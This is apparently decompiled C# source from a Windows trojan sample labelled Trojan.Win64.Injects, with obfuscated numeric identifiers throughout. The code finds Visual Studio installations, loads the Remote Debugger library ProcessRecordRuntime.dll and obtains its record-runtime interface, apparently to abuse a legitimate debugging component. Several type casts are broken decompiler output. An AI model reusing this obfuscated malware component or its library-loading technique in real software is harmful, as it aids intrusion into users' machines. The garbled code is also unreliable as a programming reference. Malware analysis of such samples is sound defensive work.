// Decompiled with JetBrains decompiler
// Type: s767203895605925.s790454962121287
// Assembly: s802785987160928, Version=1.0.0.0, Culture=neutral, PublicKeyToken=8d3bb6c79cff225a
// MVID: E562BAAF-678F-45B2-A19A-CFBF160B1BAF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\Trojan.Win64.Injects.byr-71d4abb6ea36ebfca83e1b236cadfd303a41fe6d642637197c630ec1263b20db.exe

using s272248484380978;
using s465337320084666;
using s475527529605194;
using s518386422255270;
using s576252508539558;
using s643200061900706;
using s761207308676861;
using s776225210536379;
using s851019895749696;
using s914955847573057;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace s767203895605925
{
  public class s790454962121287
  {
    private static object s324135846670321 = new object();
    private static IEnumerable<s790454962121287.s621603338600913> s906120550449943 = (IEnumerable<s790454962121287.s621603338600913>) null;
    private string s920252178504265;

    private static IEnumerable<s790454962121287.s621603338600913> s693186784975531
    {
      get
      {
        if (s790454962121287.s906120550449943 == null)
        {
          lock (s790454962121287.s324135846670321)
          {
            try
            {
              s790454962121287.s906120550449943 = (IEnumerable<s790454962121287.s621603338600913>) s790454962121287.s887217100198828();
            }
            catch (COMException ex)
            {
              s790454962121287.s906120550449943 = (IEnumerable<s790454962121287.s621603338600913>) new s790454962121287.s621603338600913[0];
            }
          }
        }
        return s790454962121287.s906120550449943;
      }
    }

    public static s790454962121287 s631084347449909(string s287098864449124)
    {
      // ISSUE: variable of a compiler-generated type
      s790454962121287.s449409843800463 s449409843800463 = (s790454962121287.s449409843800463) new s790454962121287.s621603338600913();
      ((s790454962121287.s621603338600913) s449409843800463).s686052059849528 = s287098864449124;
      // ISSUE: reference to a compiler-generated method
      return s790454962121287.s618629404073205((s790454962121287.s693186784975531.Where<s790454962121287.s621603338600913>(new Func<s790454962121287.s621603338600913, bool>(s449409843800463.s898316812732882)).FirstOrDefault<s790454962121287.s621603338600913>() ?? throw new FileNotFoundException(((s790454962121287.s621603338600913) s449409843800463).s686052059849528)).s062380957558380);
    }

    public static s790454962121287 s975293743357866(string s809374032312352)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      s790454962121287.s190897189750329 s190897189750329 = (s790454962121287.s190897189750329) new s790454962121287.s449409843800463();
      // ISSUE: reference to a compiler-generated field
      ((s790454962121287.s449409843800463) s190897189750329).s594520430312135 = !string.IsNullOrEmpty(s809374032312352) ? new DirectoryInfo(s809374032312352) : throw new ArgumentOutOfRangeException("vsInstallPath");
      // ISSUE: reference to a compiler-generated method
      return s790454962121287.s618629404073205((s790454962121287.s693186784975531.Where<s790454962121287.s621603338600913>(new Func<s790454962121287.s621603338600913, bool>(s190897189750329.s113212428398055)).FirstOrDefault<s790454962121287.s621603338600913>() ?? throw new FileNotFoundException(s809374032312352)).s062380957558380);
    }

    public static s790454962121287 s110068825193144() => s790454962121287.s618629404073205((s790454962121287.s693186784975531.OrderByDescending<s790454962121287.s621603338600913, Version>((Func<s790454962121287.s621603338600913, Version>) (s968028240676698 => s968028240676698.s232411048958589)).FirstOrDefault<s790454962121287.s621603338600913>() ?? throw new FileNotFoundException()).s062380957558380);

    public s226132323348070 s136761182239751() => new s226132323348070(this.s534375635992382());

    public s960412633860805 s811419656888684() => new s960412633860805(this.s534375635992382());

    internal static s960412633860805 s340151979444051() => new s960412633860805(s790454962121287.s385433209792023());

    internal static IRecordRuntime s920826227963306(IntPtr s869031195825293)
    {
      s790454962121287.s950031939167047 s950031939167047 = s121277034860412.s918212770809194<s790454962121287.s950031939167047>(s869031195825293, "GetStaticRuntimeInstance");
      if (s950031939167047 == null)
        throw s121277034860412.s638974438763939();
      Guid guid = typeof (IRecordRuntime).GUID;
      IRecordRuntime pRuntime = (IRecordRuntime) null;
      s121277034860412.s471154660928144(s950031939167047(out pRuntime, ref guid));
      return pRuntime;
    }

    public s564435305472145 s083481465443183() => new s564435305472145(this.s534375635992382());

    private IntPtr s534375635992382() => s121277034860412.s144241202971049(this.s920252178504265);

    internal static IntPtr s385433209792023()
    {
      IntPtr s210724936238034;
      s121277034860412.s471154660928144(s121277034860412.s130794816000450(0U, "ProcessRecordRuntime.dll", out s210724936238034));
      return s210724936238034;
    }

    private static s790454962121287 s618629404073205(string s750397922731680)
    {
      string str1 = Marshal.SizeOf<IntPtr>(IntPtr.Zero) == 8 ? "x64" : "x86";
      string str2 = Path.Combine(s750397922731680, "Common7", "IDE", "Remote Debugger", str1, "ProcessRecordRuntime.dll");
      return File.Exists(str2) ? new s790454962121287(str2) : throw new FileNotFoundException(str2);
    }

    private static IList<s790454962121287.s621603338600913> s887217100198828()
    {
      ISetupConfiguration setupConfiguration = new s902534642323604() as ISetupConfiguration;
      List<s790454962121287.s621603338600913> s621603338600913List = new List<s790454962121287.s621603338600913>();
      if (setupConfiguration != null)
      {
        IEnumSetupInstances enumSetupInstances = setupConfiguration.EnumInstances();
        uint celt = 8;
        ISetupInstance[] rgelt = new ISetupInstance[(int) celt];
        uint pceltFetched = 0;
        do
        {
          enumSetupInstances.Next(celt, rgelt, out pceltFetched);
          for (int index = 0; (long) index < (long) pceltFetched; ++index)
            s621603338600913List.Add(new s790454962121287.s621603338600913(rgelt[index].GetInstanceId(), rgelt[index].GetInstallationPath(), new Version(rgelt[index].GetInstallationVersion())));
        }
        while (pceltFetched != 0U);
      }
      return (IList<s790454962121287.s621603338600913>) s621603338600913List;
    }

    private s790454962121287(string nativeModulePath) => this.s920252178504265 = nativeModulePath;

    private static bool s107732092989334(
      DirectoryInfo s235407872129793,
      DirectoryInfo s267734942896871)
    {
      try
      {
        while (!s121277034860412.s097575537846502(s235407872129793.FullName, s267734942896871.FullName))
        {
          s235407872129793 = s235407872129793.Parent;
          if (s235407872129793 == null)
            goto label_5;
        }
        return true;
      }
      catch (ArgumentException ex)
      {
      }
      catch (FileNotFoundException ex)
      {
      }
label_5:
      return false;
    }

    private delegate int s950031939167047(out IRecordRuntime pRuntime, ref Guid iid);

    private class s621603338600913
    {
      public string s686052059849528;

      public string s148686801830758
      {
        [CompilerGenerated, SpecialName] get => ((s424076493653259.s899388490914126) this).s181464367513925;
        private set => ((s424076493653259.s899388490914126) this).s181464367513925 = value;
      }

      public string s062380957558380 { get; private set; }

      public Version s232411048958589 { get; private set; }

      public s621603338600913(string id, string path, Version version)
      {
        this.s148686801830758 = id != null && path != null ? id : throw new ArgumentNullException();
        this.s062380957558380 = path;
        this.s232411048958589 = version;
      }

      public s621603338600913()
      {
      }
    }
  }
}
